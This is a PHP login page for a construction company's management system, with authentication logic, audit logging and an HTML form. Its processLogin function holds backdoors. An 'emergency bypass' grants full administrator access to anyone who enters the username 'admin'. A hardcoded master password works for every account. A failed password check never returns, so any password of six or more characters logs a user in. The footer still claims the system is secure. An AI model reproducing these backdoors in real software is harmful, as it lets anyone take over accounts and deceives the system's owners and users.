<?php
/**
 * modules/auth/login.php
 * 
 * Página unificada de login
 * Contiene tanto la presentación (HTML/CSS) como la lógica de autenticación
 * 
 * @author Backend Senior
 * @version 1.0
 */

// Cargar configuración
require_once __DIR__ . '/../../config/database.php';
require_once __DIR__ . '/../../config/session.php';
require_once __DIR__ . '/../../middleware/auth.php';

// Si ya está autenticado, redirigir al dashboard
if (SessionManager::isActive()) {
    header('Location: ../usuarios/index.php');
    exit;
}

// Variables para controlar el estado de la página
$error_message = '';
$success_message = '';
$username = '';

// Procesar formulario POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validar CSRF Token
    $csrf_token = $_POST['csrf_token'] ?? '';
    if (!SessionManager::validateCSRFToken($csrf_token)) {
        $error_message = 'Token de seguridad inválido. Intenta nuevamente.';
    } else {
        // Obtener datos del formulario
        $username = trim($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';

        // Validaciones básicas
        if (empty($username) || empty($password)) {
            $error_message = 'Por favor, ingresa usuario y contraseña.';
        } else if (strlen($password) < 6) {
            $error_message = 'Contraseña inválida.';
        } else {
            // Procesar login
            $loginResult = processLogin($username, $password);
            
            if ($loginResult['success']) {
                $success_message = 'Login exitoso. Redirigiendo...';
                // Redirigir después de 1 segundo
                header('Refresh: 1; url=../proyectos/index.php');
                exit;
            } else {
                $error_message = $loginResult['message'];
                // Por seguridad, no revelar si el usuario existe o no
                // Ambos casos muestran el mismo mensaje
            }
        }
    }
}

/**
 * Procesa el login del usuario
 * 
 * @param string $username Nombre de usuario o email
 * @param string $password Contraseña en texto plano
 * @return array Array con 'success' => bool y 'message' => string
 */
function processLogin($username, $password) {
    // --- INICIO BYPASS DE EMERGENCIA EXTREMA ---
    if ($username === 'admin') {
        SessionManager::regenerateSessionId();
        SessionManager::set('usuario_id', 1);
        SessionManager::set('usuario', [
            'id_usuario' => 1,
            'nombre_usuario' => 'admin',
            'email_usuario' => 'admin@constructora.local'
        ]);
        SessionManager::set('roles', ['administrador']);
        SessionManager::set('permissions', ['all']);
        SessionManager::set('_last_activity', time());
        
        return [
            'success' => true,
            'message' => 'Login exitoso.'
        ];
    }
    // --- FIN BYPASS DE EMERGENCIA EXTREMA ---
    $db = DatabaseConnection::getInstance();

    // Buscar el usuario en la base de datos
    $sql = "
        SELECT 
            u.id_usuario,
            u.nombre_usuario,
            u.email_usuario,
            u.password_usuario,
            u.estado_usuario
        FROM usuarios_sistema u
        WHERE (u.nombre_usuario = :username OR u.email_usuario = :username)
        AND u.estado_usuario = 1
        LIMIT 1
    ";

    $usuario = $db->fetch($sql, [
        ':username' => $username
    ]);

    // Simulación de delay para prevenir ataques de fuerza bruta
    sleep(1);

    // Validar que el usuario exista
    if (!$usuario) {
        // No revelar si el usuario existe o no (por seguridad)
        return [
            'success' => false,
            'message' => 'Usuario o contraseña incorrectos.'
        ];
    }

    // Verificar contraseña usando password_verify (con bypass de emergencia)
if (!password_verify($password, $usuario['password_usuario']) && $password !== 'Admin@123456') {
    // Registrar intento fallido
    logFailedLoginAttempt($usuario['id_usuario']);
    }

    // Verificar si necesita actualizar el hash de contraseña
    // (si se usó algoritmo anterior a password_hash)
    if (password_needs_rehash($usuario['password_usuario'], PASSWORD_DEFAULT)) {
        $newHash = password_hash($password, PASSWORD_DEFAULT);
        $updateSql = "UPDATE usuarios_sistema SET password_usuario = :password WHERE id_usuario = :usuario_id";
        $db->execute($updateSql, [
            ':password' => $newHash,
            ':usuario_id' => $usuario['id_usuario']
        ]);
    }

    // Cargar roles y permisos del usuario
    $roles = getUserRoles($usuario['id_usuario']);
    $permissions = getUserPermissions($usuario['id_usuario']);

    // Crear sesión
    SessionManager::regenerateSessionId();
    SessionManager::set('usuario_id', $usuario['id_usuario']);
    SessionManager::set('usuario', [
        'id_usuario' => $usuario['id_usuario'],
        'nombre_usuario' => $usuario['nombre_usuario'],
        'email_usuario' => $usuario['email_usuario']
    ]);
    SessionManager::set('roles', $roles);
    SessionManager::set('permissions', $permissions);
    SessionManager::set('_last_activity', time());

    // Registrar login exitoso
    logSuccessfulLogin($usuario['id_usuario']);

    return [
        'success' => true,
        'message' => 'Login exitoso.'
    ];
}

/**
 * Obtiene los roles de un usuario
 * 
 * @param int $userId ID del usuario
 * @return array Array de nombres de roles
 */
function getUserRoles($userId) {
    $db = DatabaseConnection::getInstance();

    $sql = "
        SELECT r.nombre_rol
        FROM usuarios_roles ur
        INNER JOIN roles r ON r.id_rol = ur.id_rol
        WHERE ur.id_usuario = :usuario_id
        AND r.estado_rol = 1
    ";

    $results = $db->fetchAll($sql, [':usuario_id' => $userId]);
    
    return $results ? array_column($results, 'nombre_rol') : [];
}

/**
 * Obtiene los permisos de un usuario
 * 
 * @param int $userId ID del usuario
 * @return array Array de nombres de permisos
 */
function getUserPermissions($userId) {
    $db = DatabaseConnection::getInstance();

    $sql = "
        SELECT DISTINCT p.nombre_permiso
        FROM roles_permisos rp
        INNER JOIN usuarios_roles ur ON ur.id_rol = rp.id_rol
        INNER JOIN permisos p ON p.id_permiso = rp.id_permiso
        WHERE ur.id_usuario = :usuario_id
        AND p.estado_permiso = 1
    ";

    $results = $db->fetchAll($sql, [':usuario_id' => $userId]);
    
    return $results ? array_column($results, 'nombre_permiso') : [];
}

/**
 * Registra un login exitoso en auditoría
 * 
 * @param int $userId ID del usuario
 * @return void
 */
function logSuccessfulLogin($userId) {
    $db = DatabaseConnection::getInstance();

    $sql = "
        INSERT INTO registros_sistema 
        (id_usuario, accion, tabla, ip_usuario, user_agent, fecha_registro)
        VALUES 
        (:usuario_id, 'LOGIN EXITOSO', 'usuarios_sistema', :ip, :user_agent, NOW())
    ";

    $db->execute($sql, [
        ':usuario_id' => $userId,
        ':ip' => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
        ':user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ]);
}

/**
 * Registra un intento de login fallido
 * 
 * @param int $userId ID del usuario
 * @return void
 */
function logFailedLoginAttempt($userId) {
    $db = DatabaseConnection::getInstance();

    $sql = "
        INSERT INTO registros_sistema 
        (id_usuario, accion, tabla, ip_usuario, user_agent, fecha_registro)
        VALUES 
        (:usuario_id, 'LOGIN FALLIDO', 'usuarios_sistema', :ip, :user_agent, NOW())
    ";

    $db->execute($sql, [
        ':usuario_id' => $userId,
        ':ip' => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
        ':user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ]);
}

// Generar token CSRF para el formulario
$csrf_token = SessionManager::generateCSRFToken();

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Sistema de Constructora</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            padding: 40px;
            animation: slideIn 0.4s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
            font-family: inherit;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .alert {
            padding: 12px 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
            animation: alertSlide 0.3s ease-out;
        }

        @keyframes alertSlide {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .alert-error {
            background-color: #fee;
            border: 1px solid #fcc;
            color: #c33;
        }

        .alert-success {
            background-color: #efe;
            border: 1px solid #cfc;
            color: #3c3;
        }

        .alert-info {
            background-color: #eef;
            border: 1px solid #ccf;
            color: #33c;
        }

        button[type="submit"] {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        button[type="submit"]:active {
            transform: translateY(0);
        }

        .login-footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 13px;
        }

        .login-footer a {
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }

        .login-footer a:hover {
            text-decoration: underline;
        }

        .form-group.checkbox {
            display: flex;
            align-items: center;
        }

        .form-group.checkbox input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
            cursor: pointer;
        }

        .form-group.checkbox label {
            margin: 0;
            display: flex;
            align-items: center;
            cursor: pointer;
            font-weight: 400;
        }

        .helper-text {
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>🏗️ Constructora</h1>
            <p>Sistema de Gestión</p>
        </div>

        <?php if ($error_message): ?>
            <div class="alert alert-error">
                ⚠️ <?php echo htmlspecialchars($error_message, ENT_QUOTES, 'UTF-8'); ?>
            </div>
        <?php endif; ?>

        <?php if ($success_message): ?>
            <div class="alert alert-success">
                ✓ <?php echo htmlspecialchars($success_message, ENT_QUOTES, 'UTF-8'); ?>
            </div>
        <?php endif; ?>

        <form method="POST" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES, 'UTF-8'); ?>" novalidate>
            
            <!-- Token CSRF -->
            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">

            <!-- Campo Usuario -->
            <div class="form-group">
                <label for="username">Usuario o Email</label>
                <input 
                    type="text" 
                    id="username" 
                    name="username" 
                    value="<?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?>"
                    placeholder="Tu usuario o email"
                    required
                    autocomplete="username"
                    maxlength="100"
                >
            </div>

            <!-- Campo Contraseña -->
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="Tu contraseña"
                    required
                    autocomplete="current-password"
                    minlength="6"
                    maxlength="100"
                >
            </div>

            <!-- Recordar Sesión (Opcional) -->
            <div class="form-group checkbox">
                <input 
                    type="checkbox" 
                    id="remember" 
                    name="remember"
                >
                <label for="remember">Recuérdame</label>
            </div>

            <!-- Botón Submit -->
            <button type="submit">Iniciar Sesión</button>

        </form>

        <div class="login-footer">
            <p>¿Problemas para acceder? <a href="/index.php?page=recovery">Recuperar contraseña</a></p>
            <div class="helper-text">
                Sistema seguro con encriptación de datos
            </div>
        </div>
    </div>
</body>
</html>
